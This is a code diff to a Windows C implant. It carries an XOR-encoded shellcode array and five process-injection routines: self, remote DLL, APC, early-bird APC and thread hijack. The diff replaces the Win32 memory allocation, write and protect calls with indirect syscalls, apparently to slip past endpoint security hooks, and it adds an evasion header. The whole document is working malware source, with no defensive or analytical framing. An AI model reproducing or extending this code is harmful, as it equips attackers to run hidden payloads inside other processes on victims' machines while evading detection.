@@ -5,6 +5,7 @@
 #include "config.h"
 #include <tlhelp32.h>
 #include <winternl.h>
+#include "evasion.h"
 
 PVOID manual_procaddress(HMODULE hModule, const char* funcName);
 
@@ -39,25 +40,32 @@ VOID inject_self(IMPLANT_CONFIG config) {
     unsigned char buf[] = { 0xbe, 0x0a, 0xc3, 0xa6, 0xb2, 0xbd, 0xbd, 0xbd, 0xaa, 0x8e, 0x42, 0x42, 0x42, 0x03, 0x13, 0x03, 0x12, 0x10, 0x0a, 0x73, 0x90, 0x27, 0x0a, 0xc9, 0x10, 0x22, 0x13, 0x14, 0x0a, 0xc9, 0x10, 0x5a, 0x0a, 0xc9, 0x10, 0x62, 0x0a, 0x4d, 0xf5, 0x08, 0x0a, 0x0a, 0xc9, 0x30, 0x12, 0x03, 0xfb, 0x76, 0xbd, 0xc7, 0x8d, 0x0a, 0x73, 0x82, 0xee, 0x7e, 0x23, 0x3e, 0x40, 0x6e, 0x62, 0x03, 0x83, 0x8b, 0x4f, 0x03, 0x43, 0x83, 0xa0, 0xaf, 0x10, 0x03, 0x13, 0x0a, 0xc9, 0x10, 0x62, 0xc9, 0x00, 0x7e, 0x0a, 0x43, 0x92, 0x24, 0xc3, 0x3a, 0x5a, 0x49, 0x40, 0x4d, 0xc7, 0x2d, 0x42, 0x42, 0x42, 0xc9, 0xc2, 0xca, 0x42, 0x42, 0x42, 0x0a, 0xc7, 0x82, 0x36, 0x26, 0x0a, 0x43, 0x92, 0xc9, 0x0a, 0x5a, 0x12, 0x06, 0xc9, 0x02, 0x62, 0x0b, 0x43, 0x92, 0xa1, 0x11, 0x06, 0xc9, 0x0e, 0x66, 0x4a, 0x0a, 0xbd, 0x8b, 0x03, 0xc9, 0x76, 0xca, 0x0a, 0x43, 0x94, 0x0a, 0x73, 0x82, 0xee, 0x03, 0x83, 0x8b, 0x4f, 0x03, 0x43, 0x83, 0x7a, 0xa2, 0x37, 0xb3, 0x07, 0x7b, 0x93, 0x37, 0x99, 0x1a, 0x06, 0xc9, 0x02, 0x66, 0x0b, 0x43, 0x92, 0x24, 0x03, 0xc9, 0x4e, 0x0a, 0x06, 0xc9, 0x02, 0x5e, 0x0b, 0x43, 0x92, 0x03, 0xc9, 0x46, 0xca, 0x0a, 0x43, 0x92, 0x03, 0x1a, 0x03, 0x1a, 0x1c, 0x1b, 0x18, 0x03, 0x1a, 0x03, 0x1b, 0x03, 0x18, 0x0a, 0xc1, 0xae, 0x62, 0x03, 0x10, 0xbd, 0xa2, 0x1a, 0x03, 0x1b, 0x18, 0x0a, 0xc9, 0x50, 0xab, 0x09, 0xbd, 0xbd, 0xbd, 0x1f, 0xaa, 0x49, 0x42, 0x42, 0x42, 0x37, 0x31, 0x27, 0x30, 0x71, 0x70, 0x6c, 0x26, 0x2e, 0x2e, 0x42, 0x1b, 0x03, 0xf8, 0x29, 0xc7, 0xad, 0x4b, 0xbd, 0x97, 0x0b, 0x85, 0x83, 0x42, 0x42, 0x42, 0x42, 0xaa, 0x48, 0x42, 0x42, 0x42, 0x11, 0x36, 0x23, 0x30, 0x24, 0x2d, 0x30, 0x25, 0x27, 0x42, 0x18, 0xaa, 0x47, 0x42, 0x42, 0x42, 0x16, 0x27, 0x31, 0x36, 0x42, 0x03, 0x1a, 0x0a, 0x73, 0x8b, 0x03, 0xf8, 0x9a, 0x4b, 0x12, 0x63, 0xbd, 0x97, 0x0a, 0x73, 0x8b, 0x03, 0xf8, 0x87, 0xf3, 0xd0, 0x8a, 0xbd, 0x97 };
 
     HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
-    RESOLVE(pVirtualAlloc, VirtualAlloc, k32);
-    RESOLVE(pVirtualProtect, VirtualProtect, k32);
     RESOLVE(pVirtualFree, VirtualFree, k32);
     RESOLVE(pCreateThread, CreateThread, k32);
     RESOLVE(pWaitForSingleObject, WaitForSingleObject, k32);
     RESOLVE(pCloseHandle, CloseHandle, k32);
 
-    PVOID allocate_mem = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (allocate_mem != NULL) printf("[x] Memory Allocated to Self\n");
+    // VirtualAllocEx → iNtAllocateVirtualMemory
+    PVOID base = NULL;
+    SIZE_T allocSize = sizeof(buf);
+    g_ssn = getSSN("NtAllocateVirtualMemory");
+    g_syscall = getSyscallAddr("NtAllocateVirtualMemory");
+    NTSTATUS status = iNtAllocateVirtualMemory(GetCurrentProcess(), &base, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID inject_addr = base;
 
     for (int i = 0; i < sizeof(buf); i++)
         buf[i] ^= config.xor_key;
 
-    PVOID injected_loc = memcpy(allocate_mem, buf, sizeof(buf));
+    PVOID injected_loc = memcpy(base, buf, sizeof(buf));
     if (injected_loc != NULL) printf("[x] Shellcode Injected\n");
 
     DWORD old = 0;
-    if (VirtualProtect(injected_loc, sizeof(buf), PAGE_EXECUTE_READ, &old))
-        printf("[x] Execute Memory Enabled\n");
+    // VirtualProtectEx → iNtProtectVirtualMemory
+    PVOID protBase = inject_addr;
+    SIZE_T protSize = sizeof(buf);
+    g_ssn = getSSN("NtProtectVirtualMemory");
+    g_syscall = getSyscallAddr("NtProtectVirtualMemory");
+    iNtProtectVirtualMemory(GetCurrentProcess(), &protBase, &protSize, PAGE_EXECUTE_READ, &old);
 
     HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)injected_loc, NULL, 0, NULL);
     if (t != NULL) {
@@ -66,15 +74,12 @@ VOID inject_self(IMPLANT_CONFIG config) {
     }
 
     CloseHandle(t);
-    VirtualFree(allocate_mem, 0, MEM_RELEASE);
+    VirtualFree(base, 0, MEM_RELEASE);
 }
 
 VOID remote_inject(DWORD pid, wchar_t* dllPath) {
-
     HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
     RESOLVE(pOpenProcess, OpenProcess, k32);
-    RESOLVE(pVirtualAllocEx, VirtualAllocEx, k32);
-    RESOLVE(pWriteProcessMemory, WriteProcessMemory, k32);
     RESOLVE(pCreateRemoteThread, CreateRemoteThread, k32);
     RESOLVE(pVirtualFreeEx, VirtualFreeEx, k32);
     RESOLVE(pWaitForSingleObject, WaitForSingleObject, k32);
@@ -86,14 +91,24 @@ VOID remote_inject(DWORD pid, wchar_t* dllPath) {
 
     SIZE_T dllPathSize = (wcslen(dllPath) + 1) * sizeof(WCHAR);
 
+    PVOID base = NULL;
+    SIZE_T allocSize = dllPathSize;
+    g_ssn = getSSN("NtAllocateVirtualMemory");
 
-    LPVOID inject_addr = VirtualAllocEx(remote_proc, NULL, dllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (inject_addr != NULL) printf("[x] Allocated memory in process\n");
-    else { printf("[-] Failed to allocate memory in process\n"); CloseHandle(remote_proc); return; }
+    g_syscall = getSyscallAddr("NtAllocateVirtualMemory");
 
-    if (WriteProcessMemory(remote_proc, inject_addr, dllPath, dllPathSize, NULL))
-        printf("[x] Written DLL path to process\n");
-    else printf("[-] Failed to write DLL path to process\n");
+    NTSTATUS status = iNtAllocateVirtualMemory(remote_proc, &base, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (status != 0) {
+        printf("[-] Failed to allocate memory!\n");
+        return;
+    }
+    printf("Allocated memory at %p\n", base);
+    LPVOID inject_addr = base;
+
+    SIZE_T bytesWritten = 0;
+    g_ssn = getSSN("NtWriteVirtualMemory");
+    g_syscall = getSyscallAddr("NtWriteVirtualMemory");
+    iNtWriteVirtualMemory(remote_proc, inject_addr, dllPath, dllPathSize, &bytesWritten);
 
     LPVOID loadLibAddr = manual_procaddress(k32, "LoadLibraryW");
     if (!loadLibAddr) { printf("[-] Failed to resolve LoadLibraryW\n"); return; }
@@ -121,9 +136,6 @@ VOID apc_inject(IMPLANT_CONFIG config) {
 
     HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
     RESOLVE(pOpenProcess, OpenProcess, k32);
-    RESOLVE(pVirtualAllocEx, VirtualAllocEx, k32);
-    RESOLVE(pWriteProcessMemory, WriteProcessMemory, k32);
-    RESOLVE(pVirtualProtectEx, VirtualProtectEx, k32);
     RESOLVE(pVirtualFreeEx, VirtualFreeEx, k32);
     RESOLVE(pCreateToolhelp32Snapshot, CreateToolhelp32Snapshot, k32);
     RESOLVE(pThread32First, Thread32First, k32);
@@ -140,21 +152,30 @@ VOID apc_inject(IMPLANT_CONFIG config) {
     if (snapshot_handle != INVALID_HANDLE_VALUE) printf("[x] Snapshotting threads\n");
     else { printf("[-] Failed to snapshot threads\n"); CloseHandle(remote_proc); return; }
 
-    LPVOID inject_addr = VirtualAllocEx(remote_proc, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (inject_addr != NULL) printf("[x] Allocated memory in target\n");
-    else { printf("[-] Failed to allocate memory in target\n"); goto cleanup_apc; }
+    // VirtualAllocEx → iNtAllocateVirtualMemory
+    PVOID base = NULL;
+    SIZE_T allocSize = sizeof(buf);
+    g_ssn = getSSN("NtAllocateVirtualMemory");
+    g_syscall = getSyscallAddr("NtAllocateVirtualMemory");
+    NTSTATUS status = iNtAllocateVirtualMemory(remote_proc, &base, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID inject_addr = base;
 
     for (int i = 0; i < sizeof(buf); i++)
         buf[i] ^= config.xor_key;
 
-    if (WriteProcessMemory(remote_proc, inject_addr, buf, sizeof(buf), NULL))
-        printf("[x] Wrote shellcode to target\n");
-    else printf("[-] Failed to write shellcode to target\n");
+    // WriteProcessMemory → iNtWriteVirtualMemory
+    SIZE_T bytesWritten = 0;
+    g_ssn = getSSN("NtWriteVirtualMemory");
+    g_syscall = getSyscallAddr("NtWriteVirtualMemory");
+    iNtWriteVirtualMemory(remote_proc, inject_addr, buf, sizeof(buf), &bytesWritten);
 
-    DWORD old = 0;
-    if (VirtualProtectEx(remote_proc, inject_addr, sizeof(buf), PAGE_EXECUTE_READ, &old))
-        printf("[x] Execute Memory Enabled\n");
-    else printf("[-] Failed to enable execute memory\n");
+    // VirtualProtectEx → iNtProtectVirtualMemory
+    ULONG old = 0;
+    PVOID protBase = inject_addr;
+    SIZE_T protSize = sizeof(buf);
+    g_ssn = getSSN("NtProtectVirtualMemory");
+    g_syscall = getSyscallAddr("NtProtectVirtualMemory");
+    iNtProtectVirtualMemory(remote_proc, &protBase, &protSize, PAGE_EXECUTE_READ, &old);
 
     THREADENTRY32 te;
     te.dwSize = sizeof(THREADENTRY32);
@@ -180,9 +201,6 @@ VOID early_apc_inject(IMPLANT_CONFIG config) {
 
     HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
     RESOLVE(pCreateProcessW, CreateProcessW, k32);
-    RESOLVE(pVirtualAllocEx, VirtualAllocEx, k32);
-    RESOLVE(pWriteProcessMemory, WriteProcessMemory, k32);
-    RESOLVE(pVirtualProtectEx, VirtualProtectEx, k32);
     RESOLVE(pQueueUserAPC, QueueUserAPC, k32);
     RESOLVE(pResumeThread, ResumeThread, k32);
     RESOLVE(pCloseHandle, CloseHandle, k32);
@@ -203,18 +221,27 @@ VOID early_apc_inject(IMPLANT_CONFIG config) {
     for (int i = 0; i < sizeof(buf); i++)
         buf[i] ^= config.xor_key;
 
-    LPVOID inject_addr = VirtualAllocEx(pi.hProcess, NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (inject_addr != NULL) printf("[x] Allocated memory in target\n");
-    else { printf("[-] Failed to allocate memory in target\n"); goto cleanup_early; }
+    // VirtualAllocEx → iNtAllocateVirtualMemory
+    PVOID base = NULL;
+    SIZE_T allocSize = sizeof(buf);
+    g_ssn = getSSN("NtAllocateVirtualMemory");
+    g_syscall = getSyscallAddr("NtAllocateVirtualMemory");
+    NTSTATUS status = iNtAllocateVirtualMemory(pi.hProcess, &base, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID inject_addr = base;
 
-    if (WriteProcessMemory(pi.hProcess, inject_addr, buf, sizeof(buf), NULL))
-        printf("[x] Wrote shellcode to target\n");
-    else printf("[-] Failed to write shellcode to target\n");
+    // WriteProcessMemory → iNtWriteVirtualMemory
+    SIZE_T bytesWritten = 0;
+    g_ssn = getSSN("NtWriteVirtualMemory");
+    g_syscall = getSyscallAddr("NtWriteVirtualMemory");
+    iNtWriteVirtualMemory(pi.hProcess, inject_addr, buf, sizeof(buf), &bytesWritten);
 
+    // VirtualProtectEx → iNtProtectVirtualMemory
     DWORD old = 0;
-    if (VirtualProtectEx(pi.hProcess, inject_addr, sizeof(buf), PAGE_EXECUTE_READ, &old))
-        printf("[x] Execute Memory Enabled\n");
-    else printf("[-] Failed to enable execute memory\n");
+    PVOID protBase = inject_addr;
+    SIZE_T protSize = sizeof(buf);
+    g_ssn = getSSN("NtProtectVirtualMemory");
+    g_syscall = getSyscallAddr("NtProtectVirtualMemory");
+    iNtProtectVirtualMemory(pi.hProcess, &protBase, &protSize, PAGE_EXECUTE_READ, &old);
 
     QueueUserAPC((PAPCFUNC)inject_addr, pi.hThread, 0);
     ResumeThread(pi.hThread);
@@ -279,9 +306,6 @@ VOID thread_hijack(IMPLANT_CONFIG config) {
 
     HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
     RESOLVE(pCreateProcessW, CreateProcessW, k32);
-    RESOLVE(pVirtualAllocEx, VirtualAllocEx, k32);
-    RESOLVE(pWriteProcessMemory, WriteProcessMemory, k32);
-    RESOLVE(pVirtualProtectEx, VirtualProtectEx, k32);
     RESOLVE(pQueueUserAPC, QueueUserAPC, k32);
     RESOLVE(pResumeThread, ResumeThread, k32);
     RESOLVE(pCloseHandle, CloseHandle, k32);
@@ -329,24 +353,30 @@ VOID thread_hijack(IMPLANT_CONFIG config) {
 
    // NtUnmapViewOfSection(pi.hProcess,image_base);
 
-    LPVOID inject_addr = VirtualAllocEx(pi.hProcess, 
-        NULL, 
-        sizeof(buf), 
-        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (inject_addr != NULL) printf("[x] Allocated memory in target\n");
-    else { printf("[-] Failed to allocate memory in target\n"); }
+ // VirtualAllocEx → iNtAllocateVirtualMemory
+    PVOID base = NULL;
+    SIZE_T allocSize = sizeof(buf);
+    g_ssn = getSSN("NtAllocateVirtualMemory");
+    g_syscall = getSyscallAddr("NtAllocateVirtualMemory");
+    NTSTATUS status = iNtAllocateVirtualMemory(pi.hProcess, &base, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    LPVOID inject_addr = base;
 
     for (int i = 0; i < sizeof(buf); i++)
         buf[i] ^= config.xor_key;
 
-    if (WriteProcessMemory(pi.hProcess, inject_addr, buf, sizeof(buf), NULL))
-        printf("[x] Written shellcode to process\n");
-    else printf("[-] Failed to write shellcode to process\n");
+    // WriteProcessMemory → iNtWriteVirtualMemory
+    SIZE_T bytesWritten = 0;
+    g_ssn = getSSN("NtWriteVirtualMemory");
+    g_syscall = getSyscallAddr("NtWriteVirtualMemory");
+    iNtWriteVirtualMemory(pi.hProcess, inject_addr, buf, sizeof(buf), &bytesWritten);
 
+    // VirtualProtectEx → iNtProtectVirtualMemory
     DWORD old = 0;
-    if (VirtualProtectEx(pi.hProcess, inject_addr, sizeof(buf), PAGE_EXECUTE_READ, &old))
-        printf("[x] Execute Memory Enabled\n");
-    else printf("[-] Failed to enable execute memory\n");
+    PVOID protBase = inject_addr;
+    SIZE_T protSize = sizeof(buf);
+    g_ssn = getSSN("NtProtectVirtualMemory");
+    g_syscall = getSyscallAddr("NtProtectVirtualMemory");
+    iNtProtectVirtualMemory(pi.hProcess, &protBase, &protSize, PAGE_EXECUTE_READ, &old);
 
     CONTEXT thread_context = { 0 };
     thread_context.ContextFlags = CONTEXT_FULL;  // set before GetThreadContext
